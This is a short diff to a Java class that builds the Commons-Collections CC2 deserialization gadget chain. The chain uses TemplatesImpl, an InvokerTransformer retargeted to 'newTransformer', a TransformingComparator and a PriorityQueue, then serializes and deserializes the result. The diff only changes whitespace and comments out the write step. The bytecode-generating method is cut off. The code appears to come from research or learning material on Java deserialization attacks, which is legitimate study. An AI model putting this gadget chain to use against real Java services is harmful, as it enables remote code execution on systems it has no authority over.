@@ -28,7 +28,7 @@ public class CC2_TemplatesImpl {
         setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
         Transformer transformer = new InvokerTransformer("toString", null, null);
 
-        Comparator comparator = new TransformingComparator( transformer);
+        Comparator comparator = new TransformingComparator(transformer);
 
         PriorityQueue queue = new PriorityQueue(2, comparator);
         queue.add(obj);
@@ -36,8 +36,7 @@ public class CC2_TemplatesImpl {
 
         setFieldValue(transformer, "iMethodName", "newTransformer");
 
-        FileStream.writeSer(queue,"CC2_TemplatesImpl.ser");
-
+//        FileStream.writeSer(queue,"CC2_TemplatesImpl.ser");
         FileStream.readSer("CC2_TemplatesImpl.ser");
     }
     public static byte[] makeByteCode() throws Exception{
